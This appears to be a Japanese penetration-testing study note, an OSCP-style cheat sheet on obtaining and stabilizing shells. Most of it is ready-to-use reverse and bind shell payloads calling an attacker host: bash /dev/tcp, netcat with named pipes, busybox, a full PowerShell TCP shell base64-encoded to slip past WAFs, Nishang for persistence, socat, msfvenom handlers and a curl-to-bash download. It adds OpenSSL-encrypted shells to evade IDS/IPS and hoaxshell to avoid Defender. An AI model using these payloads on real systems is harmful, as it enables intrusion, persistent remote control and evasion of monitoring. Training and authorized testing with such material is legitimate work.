- 関連ノート
	- [[💥Windows Privilege Escalation]]
	- [[スクリプト・コマンド・シェル操作#コマンドの実行可否を確認する]]


> [!TIP]
> リスナーに指定するポートは、FWによる遮断を防ぐため、原則80 もしくは 443を使用すること

---

# シェルの基礎

- シェルとは、コマンドライン環境(CLI)に接続し、操作する際に使用するものを表す
- Linux でよく使われる bash や sh はシェルの一種であり、Windows の cmd.exe や Powershell もシェルの一種
- sh / bash / zsh：shは元祖、bashはshを機能拡張したもの、zshは最上位の機能を持つ

## インタラクティブシェル/非インタラクティブシェルとは

### インタラクティブシェル（対話型シェル）

 * ユーザーの入力を常に待ち受け、実行結果が即座に返ってくる対話型
 * プロンプト（`$` や `#`）が表示され、タブ補完や履歴機能、ジョブコントロールが利用可能
 ![[Pasted image 20230318182041.png]]

### 非インタラクティブシェル（非対話型シェル）

 * TTY（仮想端末）が割り当てられていないため、プログラムとの双方向のやり取りが制限される状態
 * Reverse ShellやBind Shellの初期状態（いわゆるDumb Shell）の多くはこの形式
 * ユーザーに入力を求めるプログラム（sshのパスワード入力、sudoのプロンプトなど）は、対話のための端末デバイスがないため実行できない
 * 下のキャプチャのように、引数だけで完結するwhoamiは問題なく実行できるが、対話的なセッションを必要とするsshは正常に動作しない
   ![[Pasted image 20230318182007.png | 300]]
   （上記listenerコマンドはsudo rlwrap nc -lvnp 443のaliasとして説明している）

## Bind Shellとは

ターゲットマシン上でポートをオープンし、攻撃者のマシンからターゲットに通信を確立させる方法。
攻撃者からターゲットに通信接続を試行するので、FWにより遮断されやすい。

以下はターゲットがWindowsの例。

1. ターゲット上でリスナーを立てる
```cmd
nc -lvnp <Port> -e "cmd.exe"
```

2. 攻撃者からターゲットマシンで開いたポートに接続
```zsh
nc <target_IP> <Port>
```
![[Pasted image 20230318180927.png | 900]]
$$左が攻撃側、右がターゲット側$$

## Reverse Shellとは

攻撃者のマシン上でポートをオープンし、ターゲットのマシンから攻撃者に通信を確立させる方法（Bind Shellとは逆）。

攻撃者のマシンのFW設定は自由に設定できるため、Bind Shellとは異なり、FWによる通信の遮断の影響を受けにくい。

1. 攻撃側のマシンでリスナーを用意
```zsh
sudo rlwrap nc -lvnp <Port>
```

2.  ターゲットマシンから攻撃者のマシンで開いたポートに接続
```
nc <attacker_IP> <Port> -e /bin/bash
```
![[Pasted image 20230318180351.png]]
$$左が攻撃側、右がターゲット側$$

---
---

# Common Shell Payloads

参考：[Reverse Shell Cheat Sheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## 🐧Linuxターゲット

### Bind Shell for Linux

> [!NOTE]
> 実践ではほとんど使わない。

1. ターゲットマシン上でリスナーを用意する
	 ([[#補足：名前付きパイプコマンドの解説]])
```zsh
mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

2. 攻撃者のマシンからターゲットマシンに接続する
```zsh
nc <target_IP> <Port>
```

### Reverse Shell for Linux

攻撃者のマシンでリスナーを用意しておく
```zsh
sudo rlwrap nc -lvnp <Port>
```

#### Bashだけで完結する手法

方法①：スクリプトとして保存して実行（File uploadの脆弱性などでよく使う）
```zsh
echo '#!/bin/bash
bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1' > /tmp/revshell.sh
chmod +x /tmp/revshell.sh
/tmp/revshell.sh
```

方法②：ワンライナー（WebShellやOSコマンドインジェクションでよく使う）
```zsh
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'
```

#### 名前付きパイプを使ったnetcatリバースシェル

```zsh
mkfifo /tmp/f; nc <attacker_IP> <Port> < /tmp/f | /bin/sh -i >/tmp/f 2>&1; rm /tmp/f
```
- FIFOを使って標準入出力を連携
- Bashに依存せず動作するので、環境によってはこちらの方が成功しやすい

#### シンプルなnc w/ busybox

- BusyBox（ビジーボックス）とは、`ls`、`cp`、`cat`、`nc`といった多くのUNIXコマンドの機能を1つの小さな実行ファイルにまとめたソフトウェア
- ✅ターゲットの環境に依存せず、コマンドを実行できる
```zsh
busybox nc <attacker_IP> <Port> -e sh
```

##### 補足：名前付きパイプコマンドの解説

- `mkfifo /tmp/f`:FIFO (名前付きパイプ) を作成
	- [[用語#名前付きパイプ]]
- `< /tmp/f | /bin/sh >/tmp/f 2>&1`:  攻撃者がリスナーに接続して入力した内容を"/tmp/f"に書き込み、"/bin/sh"は書き込まれた内容を入力としてshellを実行し、実行結果を標準エラー出力（2）と標準出力（1）も含めて/tmp/fに書き込むことで、攻撃者に実行結果を返す
- `2>&1` は、標準エラー出力（2）を標準出力（1）にリダイレクトすることを意味する。つまり、エラーメッセージが標準出力に統合され、同じパイプ上で送信される。この方法により、エラーメッセージもクライアントに送信される

---

## 🪟Windowsターゲット

### Bind Shell for Windows

> [!NOTE]
> 実践ではほとんど使わない。

1. ターゲットマシン上でリスナーを用意
```cmd
nc -lvnp <Port> -e "cmd.exe"
```

2. 攻撃者のマシン上からターゲットに接続
```zsh
nc <target_IP> <Port>
```

### Reverse Shell for Windows

 攻撃者側でリスナーを用意しておく
```zsh
sudo rlwrap nc -lvnp <Port>
```

#### 基本のPowerShellワンライナー

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_IP>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Base64化したPowerShellリバースシェルワンライナー

powershellはbase64エンコードされたコードをデコードして実行可能であり、WAFの回避に役立つ。
ワンライナーで実行する方法は==非常に汎用性が高い==。

1. 攻撃者のマシン上でPowerShellを起動
```zsh
pwsh
```

2. ワンライナーを作成（攻撃者マシンのリスナーのIP、ポートを入力）
```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
- powershellの`-File`に指定してファイルとして実行する場合は、シングルクオートで囲った部分をps1ファイルとして保存すればよい

3. Base64エンコードする
```powershell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
```
- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコード

4. エンコード結果を表示し、メモした後、PowerShellからexitする
```powershell
$EncodedText
exit
```

5. ターゲットマシンの環境のシェル上(WebShell等)で実行する
```zsh
# WebShellの例
curl http://example.com/shell.php?cmd=powershell -enc '<$EncodedTextの中身>'
```

#### 非推奨：`nc -e`

Windowsでは使用可能な場合もあるが、AVによりブロックされる可能性が高く、ステルス性に欠ける。
```cmd
nc -e cmd.exe <attacker_IP> <Port>
```

---
---

# WebShell

- [[WebShell]]

---
---

# シェルの安定化

## シェル安定化の必要性

- 攻撃によって得られたシェルは、機能が制限された非インタラクティブシェルであることが多く、接続が切れたり、対話式のコマンドが実行できなかったりと、使いづらい
- より安定したインタラクティブシェルに昇格させることで、内部探索を容易にする

## リスナーの立て方

攻撃者のマシン上でリスナーを用意するときはrlwrapを使うこと（OS共通）
```zsh
sudo rlwrap nc -lvnp <Port>
```
- `rlwrap`は入力補完や履歴機能などの*readline機能*を付与
- 普通の`nc`より遥かに快適なので、常に使うこと

> [!TIP]
> Unix系の場合は、[Penelope - GitHub](https://github.com/brightio/penelope)を使ったほうが非常に安定しており、Ctrl + Cなどの便利機能も標準で使える。

```zsh
# ダウンロードURL
https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
```
```zsh
# 実行（自分はパスを通している）
sudo penelope -p <port>
```

---

## 🐧 Linuxターゲット向け安定化

### 安定化 w/ Python

LinuxはPythonが標準インストールされてることが多い。

1. PythonでPTYシェルに昇格
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- 擬似端末（PTY）を起動して、見た目も操作性もbashに切り替える
- ターゲットマシンのpython verに合わせる(`python2..`等)

2.  clearやvimなど、ターミナル系のコマンドの不具合を解消するため、TERM変数を設定
```zsh
export TERM=xterm-256color
```
- シェルの表示がおかしくなれば、ターミナルが古い可能性があるため、`TERM=xterm`とする

3. `Ctrl + Z`でshellをバックグラウンド化する

4. 入出力を端末に適した形式に変更するため、rawモードへ移行し、フォアグラウンド化する
```zsh
stty raw -echo; fg
```
- ※見た目が一時的に乱れるが、安定性は向上する

> [!Info]
> シェルから離脱したいときや、文字化けや入力異常が起きたときは、`reset`を実行
> 

### 安定化 w/o Python

1. 以下のシェルスクリプトをファイルに保存する
	(ここではファイル名を`exploit.sh`とする)
```zsh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<attacker_IP>/<Port> 0>&1'
```

2. 攻撃者のマシンでWebサーバを立てる
```zsh
python -m http.server 8080
```

3. 攻撃者のマシンでリバースシェルを受け取るリスナーを立てる
```zsh
sudo rlwrap nc -lvnp <Port>
```

4. ターゲットマシンからスクリプトを起動(実行)させる
```zsh
curl <attacker_IP>/exploit.sh | bash
```

5. リバースシェルを確立したら、[[#安定化 w/ Python]]へ進む

---

## 🪟 Windowsターゲット向け安定化

Windowsでは安定化する手法が限られており、効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]か、[[#Metasploit - multi/handler]]を使う

その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
```powershell
powershell -ep bypass
chcp 65001
```

---

# シェル確立・ネットワーク操作ツール

## Netcat

- ❌デフォルトでは非常に不安定なシェル
- ✅標準インストールされていることが多い
- ✅カスタマイズ性高
- ✅列挙中にバナー情報収集するためなど、あらゆるネットワークへのインタラクションを手動で実行する

```zsh
# Bind Shell
nc <target_IP> <Port>

# Reverse Shell
nc -lvnp <Port>

# banner grabbing
nc -nv <target_IP> <port>
```

---

## Socat

- ✅netcatの強化版であり、最初から非常に安定している
- ❌文法が難しく、デフォルトでインストールされていない
- ❌**Windowsではあまり意味がない**（netcatと変わらない）
- 関連ノート：
	- [[Port Redirection & SSH Port Forwarding#LinuxツールによるPort Forwading(Socat)]]

### Linuxシェルの安定化 w/ Socat

- netcatで確立したReverse Shell（非対話型）上で以下の手法を実行することで、安定化が可能
- ✅完全にインタラクティブとなり、SSHのような対話形式のパスワード入力も可能になる

1. リスナーの用意
```zsh
socat TCP-L:<Port> FILE:`tty`,raw,echo=0
```

2. ターゲットマシンから接続
```zsh
socat TCP:<attacker_IP>:<Port> EXEC: "bash -li",pty,stderr,sigint,setsid,sane
```
- `sigint`：Ctrl + Cを可能にする
- `setsid`： 新しいセッションでプロセスを作成する
- `sane`：端末を安定させる

![[Pasted image 20230319131940.png | 800]]
$$Socatによる安定化実例$$

### Reverse Shell w/ Socat(非対話型)

1. 攻撃者側でリスナーを立てる。
```zsh
socat TCP-L:<Port> -
```
-  `-`は標準入力や出力を表す

2. コネクトバックする：

(a) Windowsの場合
```powershell
socat TCP:<attacker_IP>:<Port> EXEC:powershell.exe,pipes
```
- pipesオプションは、powershell（またはcmd.exe）にUnixスタイルの標準入出力を使用させるために使用

(b) Linuxの場合
```zsh
socat TCP:<attacker_IP>:<Port> EXEC:"bash -li"
```

### Bind Shell w/ Socat(非対話型)

1. ターゲットマシンでリスナーを立てる：

(a) Windowsの場合
```
socat TCP-L:<Port> EXEC:powershell.exe,pipes
```

(b) Linuxの場合
```
socat TCP-L:<Port> EXEC: "bash -li"
```

2. 攻撃側のマシンから接続(Linux/windows)
```zsh
socat TCP:<target_IP>:<Port> -
```

---

## Windows PowerShellのリバースシェル w/ Nishang

[Nishang - GitHub](https://github.com/samratashok/nishang)（apt install対応）

- 目的：Windowsマシンへの侵害後、永続化のため
	- 他の[[#Base64化したPowerShellリバースシェルワンライナー]]などがうまくいかないときに使う

1. 攻撃者のマシンでリバースシェルペイロードスクリプトを用意する
```zsh
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
```

2. 中身を編集し、コメントアウトを外す
```zsh
subl Invoke-PowerShellTcpOneLine.ps1
```
![[Pasted image 20251107074119.png]]
$$ペイロードは赤枠部分を使う(smは圧縮版）$$

3. PowerShellスクリプトをシェルから直接渡すため、Base64エンコードする
```zsh
cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
```

4. 足場マシンからの実行方法：

(a) エンコードしたペイロードをバッチファイルに書き込んだ上で、実行する方法
	タスクスケジューラに登録するなどの用途
```powerhsell
echo powershell -enc '<Base64エンコードされたペイロード>' > <filename>.bat
```

(b) 直接コマンドを実行する方法
```powershell
powershell -enc '<Base64エンコードされたペイロード>'
```

---

## Metasploit - multi/handler

- ✅️Windowsにおいても安定している
- Meterpreterシェルを使用したい場合は必須で、ステージングされたペイロードを使用する場合は、このツールを使用する（[[☠️Msfvenom]]）
- Metasploitフレームワークの`exploit/multi/handler`モジュールはsocat や netcat のように、リバースシェルを受信するために使用されるリスナー（OSCP examで無制限に利用可能）
	- Meterpreterシェルは、Metasploit独自の完全な機能を備えたシェル
	- ✅ファイルのアップロードやダウンロードなど、多くの機能を内蔵している
	- ❌必ずMetaSploitモジュールから通信が必要である（msfvenomの実行結果の通信など）

1. msfvenomでペイロードの生成
```zsh
sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式＞ -o <filename> LHOST=<attacker-IP> LPORT=<port>
```

2. 1024番ポート以下を使用するときはsudoで
```zsh
msfconsole -q -x "use exploit/multi/handler; set payload <生成ペイロード>; set LHOST <attacker_IP>; set LPORT <Port>; run"
```
- `exploit -j`でバックグラウンドで実行できる

- もし他のsessionがアクティブだったら、`sessions`コマンドで全てのアクティブなSessionを表示し、その中からフォアグラウンド化すべきSessionを`sessions <ID>`で選択する必要がある

---
---

# シェルの暗号化

- 目的：ネットワーク監視装置（IDS・IPS）の検知回避
	- 暗号化されたシェルは、復号鍵がない限り傍受されることはない
	- ⚠️AV/EDRに検知される

## Reverse Shellの暗号化

1. 攻撃者側で証明書を用意
```zsh
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
- 1年弱有効な自己署名証明書ファイルと2048ビットのRSA鍵を作成
- 証明書に関する情報を入力するように要求されるが、空白のままでよい

2. 作成した2つのファイルを1つの.pemファイルに統合する
```zsh
cat shell.key shell.crt > shell.pem
```
-  pemはデジタル証明書やキーのコンテナ

3. Reverse Shellリスナーを用意
	- TCP-LISTENではなく、OPENSSL-LISTEN
```zsh
socat OPENSSL-LISTEN:<Port>,cert=shell.pem,verify=0 -
```
- `verify=0`は、証明書が公認の機関によって適切に署名されていることを検証しないよう、接続に指示する。この証明書は、リスニングするデバイス側で使用する必要がある。

4.  ターゲット側から攻撃者側に接続させる
```zsh
socat OPENSSL:<attacker_IP>:<Port>,verify=0 EXEC:/bin/bash
```

## Bind Shellの暗号化

1. ターゲット上でリスナー起動
```zsh
socat OPENSSL-LISTEN:<Port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

2. 攻撃者側から接続
```zsh
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

---
---

# Tips

## RCEで一つのコマンドしか実行できないと思ったとき

- 公開エクスプロイトに、引数を取るオプションがないか確認する
	- 公開エクスプロイトから`arg`などで確認するか、`--help`を確認

## Defenderに検知されるとき

- [hoaxshell - GitHub](https://github.com/t3l3machus/hoaxshell)を使う
- ✅HTTP/HTTPSのアウトバンド通信のみを使うことで<u>Web通信に見せかける</u>ため、検知されにくい（通常のリバースシェルであればTCP通信）
- ❌安定性、即応性はTCP接続のほうが高い
